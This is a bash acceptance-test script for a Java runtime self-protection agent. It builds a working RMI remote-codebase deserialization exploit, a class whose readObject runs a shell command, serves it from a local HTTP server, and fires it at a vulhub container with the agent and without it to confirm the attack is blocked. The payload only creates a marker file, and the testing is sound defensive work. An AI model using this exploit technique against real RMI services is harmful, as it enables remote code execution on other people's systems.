#!/usr/bin/env bash
set -euo pipefail

cd "$(dirname "$0")/.."

host_agent_jar="$(pwd)/agent-java8/build/libs/ohmyrasp-agent-java8.jar"

docker run --rm -v "$(pwd):/workspace" -w /workspace gradle:jdk25 \
  gradle --no-daemon :agent-java8:agentJava8Jar

image="${OHMYRASP_VULHUB_RMI_CODEBASE_IMAGE:-vulhub/j2ee:8u222}"
baseline_name="${OHMYRASP_VULHUB_RMI_CODEBASE_BASELINE_NAME:-ohmyrasp-vulhub-rmi-codebase-baseline}"
protected_name="${OHMYRASP_VULHUB_RMI_CODEBASE_PROTECTED_NAME:-ohmyrasp-vulhub-rmi-codebase-protected}"
work_dir="${OHMYRASP_VULHUB_RMI_CODEBASE_WORKDIR:-/tmp/ohmyrasp-rmi-codebase}"
codebase_port="${OHMYRASP_VULHUB_RMI_CODEBASE_HTTP_PORT:-19194}"
success_file="/tmp/ohmyrasp-rmi-codebase-success"
baseline_dir="logs/vulhub-rmi-codebase-java8-baseline"
protected_dir="logs/vulhub-rmi-codebase-java8-protected"
protected_log="${protected_dir}/events.jsonl"
codebase_pid=""

copy_artifacts() {
  local name="$1"
  local dir="$2"
  if docker inspect "$name" >/dev/null 2>&1; then
    docker logs "$name" > "${dir}/container.log" 2>&1 || true
  fi
}

cleanup() {
  if [[ -n "$codebase_pid" ]]; then
    kill "$codebase_pid" >/dev/null 2>&1 || true
    wait "$codebase_pid" >/dev/null 2>&1 || true
  fi
  copy_artifacts "$baseline_name" "$baseline_dir"
  copy_artifacts "$protected_name" "$protected_dir"
  docker rm -f "$baseline_name" "$protected_name" >/dev/null 2>&1 || true
}
trap cleanup EXIT

ensure_port_available() {
  local port="$1"
  if timeout 1 bash -c "</dev/tcp/127.0.0.1/${port}" >/dev/null 2>&1; then
    echo "host port ${port} is already in use; Java RMI codebase acceptance uses host networking" >&2
    exit 1
  fi
}

ensure_rmi_ports_available() {
  ensure_port_available 1099
  ensure_port_available 64000
}

prepare_client() {
  mkdir -p "$work_dir"
  docker run --rm -v "${work_dir}:/work" -w /work "$image" \
    bash -lc 'rm -rf /work/* /work/.[!.]* /work/..?* 2>/dev/null || true; chmod 777 /work'
  mkdir -p "${work_dir}/src" "${work_dir}/classes"

  cat > "${work_dir}/src/ICalc.java" <<'JAVA'
import java.rmi.Remote;
import java.rmi.RemoteException;
import java.util.List;

public interface ICalc extends Remote {
    Integer sum(List<Integer> params) throws RemoteException;
}
JAVA

  cat > "${work_dir}/src/EvilParam.java" <<'JAVA'
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.Serializable;

public class EvilParam implements Serializable {
    private static final long serialVersionUID = 1L;

    private void readObject(ObjectInputStream input) throws IOException, ClassNotFoundException {
        input.defaultReadObject();
        try {
            Runtime.getRuntime()
                .exec(new String[] {"/bin/sh", "-c", "touch /tmp/ohmyrasp-rmi-codebase-success"})
                .waitFor();
        } catch (InterruptedException exception) {
            Thread.currentThread().interrupt();
            throw new IOException("interrupted while creating marker", exception);
        }
    }
}
JAVA

  cat > "${work_dir}/src/RmiCodebaseClient.java" <<'JAVA'
import java.rmi.Naming;
import java.util.ArrayList;
import java.util.List;

public class RmiCodebaseClient {
    public static void main(String[] args) throws Exception {
        if (args.length != 1) {
            throw new IllegalArgumentException("usage: RmiCodebaseClient <rmi-url>");
        }

        ICalc calc = (ICalc) Naming.lookup(args[0]);
        List params = new ArrayList();
        params.add(new EvilParam());
        calc.sum(params);
    }
}
JAVA

  docker run --rm --entrypoint /bin/bash -v "${work_dir}:/work" -w /work "$image" \
    -lc '/usr/local/openjdk-8/bin/javac -source 1.8 -target 1.8 -d classes src/*.java'
}

start_codebase_server() {
  python3 -m http.server "$codebase_port" --bind 0.0.0.0 --directory "${work_dir}/classes" \
    > "${baseline_dir}/codebase-http.log" 2>&1 &
  codebase_pid="$!"

  for attempt in $(seq 1 30); do
    if curl -fsS "http://127.0.0.1:${codebase_port}/EvilParam.class" >/dev/null 2>&1; then
      printf 'codebase_ready_attempt=%s\n' "$attempt" >> "${baseline_dir}/attempts.log"
      return
    fi
    sleep 1
  done

  echo "temporary RMI codebase HTTP server did not start on ${codebase_port}" >&2
  exit 1
}

wait_for_rmi() {
  local name="$1"
  local dir="$2"
  for attempt in $(seq 1 60); do
    if timeout 1 bash -c "</dev/tcp/127.0.0.1/1099" >/dev/null 2>&1 \
      && timeout 1 bash -c "</dev/tcp/127.0.0.1/64000" >/dev/null 2>&1; then
      printf 'rmi_ready_attempt=%s\n' "$attempt" >> "${dir}/attempts.log"
      return
    fi
    sleep 1
  done

  docker logs "$name" >&2 || true
  echo "${name} did not expose RMI registry 1099 and object port 64000" >&2
  exit 1
}

wait_for_protected_startup() {
  for attempt in $(seq 1 60); do
    if grep -Fq '"event":"ohmyrasp-java8-agent-start"' "$protected_log"; then
      printf 'agent_start_attempt=%s\n' "$attempt" >> "${protected_dir}/attempts.log"
      return
    fi
    sleep 1
  done

  cat "$protected_log" >&2 || true
  docker logs "$protected_name" >&2 || true
  echo "missing Java8 agent startup event for Java RMI codebase acceptance" >&2
  exit 1
}

run_client() {
  local dir="$1"
  local output="${dir}/rmi-codebase-client.log"
  local status

  set +e
  docker run --rm --network host --entrypoint /bin/bash \
    -v "${work_dir}/classes:/work:ro" -w /work "$image" \
    -lc "/usr/local/openjdk-8/bin/java -Djava.rmi.server.codebase=http://127.0.0.1:${codebase_port}/ -cp /work RmiCodebaseClient rmi://127.0.0.1:1099/refObj" \
    > "$output" 2>&1
  status=$?
  set -e
  printf 'client_status=%s\n' "$status" >> "${dir}/attempts.log"
}

start_baseline() {
  docker run -d --name "$baseline_name" --network host \
    -e RMIIP=127.0.0.1 \
    "$image" >/dev/null
  wait_for_rmi "$baseline_name" "$baseline_dir"
}

start_protected() {
  docker run -d --name "$protected_name" --network host \
    -v "${host_agent_jar}:/tmp/ohmyrasp-agent-java8.jar:ro" \
    -v "$(pwd)/${protected_dir}:/tmp/ohmyrasp-logs" \
    -e RMIIP=127.0.0.1 \
    "$image" \
    bash -c '/usr/local/openjdk-8/bin/java -javaagent:/tmp/ohmyrasp-agent-java8.jar -Dohmyrasp.java8.log=/tmp/ohmyrasp-logs/events.jsonl -Dohmyrasp.java8.block=true -Djava.rmi.server.hostname=${RMIIP} -Djava.rmi.server.useCodebaseOnly=false -Djava.security.policy=client.policy RemoteRMIServer' \
    >/dev/null
  wait_for_rmi "$protected_name" "$protected_dir"
  wait_for_protected_startup
}

run_baseline() {
  start_baseline
  docker exec "$baseline_name" rm -f "$success_file"
  run_client "$baseline_dir"

  for attempt in $(seq 1 10); do
    if docker exec "$baseline_name" test -e "$success_file"; then
      printf 'baseline_marker_attempt=%s\n' "$attempt" >> "${baseline_dir}/attempts.log"
      copy_artifacts "$baseline_name" "$baseline_dir"
      docker rm -f "$baseline_name" >/dev/null 2>&1 || true
      return
    fi
    sleep 1
  done

  docker logs "$baseline_name" >&2 || true
  cat "${baseline_dir}/rmi-codebase-client.log" >&2 || true
  cat "${baseline_dir}/codebase-http.log" >&2 || true
  echo "baseline Java RMI codebase did not load the remote class and create ${success_file}" >&2
  exit 1
}

run_protected() {
  start_protected
  if grep -Fq '"event":"ohmyrasp-detection"' "$protected_log"; then
    cat "$protected_log" >&2
    echo "protected Java RMI codebase container produced a detection before exploit traffic" >&2
    exit 1
  fi

  docker exec "$protected_name" rm -f "$success_file"
  run_client "$protected_dir"
  sleep 2

  if docker exec "$protected_name" test -e "$success_file"; then
    echo "protected Java RMI codebase created ${success_file} despite Java8 RASP" >&2
    exit 1
  fi
  if ! grep -Eq '"algorithm":"java8_classloader_remote_codebase".*"action":"block"' "$protected_log"; then
    cat "$protected_log" >&2 || true
    docker logs "$protected_name" >&2 || true
    echo "missing java8_classloader_remote_codebase block event for Java RMI codebase" >&2
    exit 1
  fi
  if ! grep -Fq "http://127.0.0.1:${codebase_port}/" "$protected_log"; then
    cat "$protected_log" >&2 || true
    echo "Java RMI codebase block event did not include the remote HTTP codebase" >&2
    exit 1
  fi
}

rm -rf "$baseline_dir" "$protected_dir"
mkdir -p "$baseline_dir" "$protected_dir"
: > "$protected_log"
chmod 666 "$protected_log"
docker rm -f "$baseline_name" "$protected_name" >/dev/null 2>&1 || true
ensure_rmi_ports_available
ensure_port_available "$codebase_port"

prepare_client
start_codebase_server
run_baseline
ensure_rmi_ports_available
run_protected

copy_artifacts "$protected_name" "$protected_dir"
docker rm -f "$protected_name" >/dev/null 2>&1 || true

echo "vulhub Java RMI codebase Java8 acceptance passed"
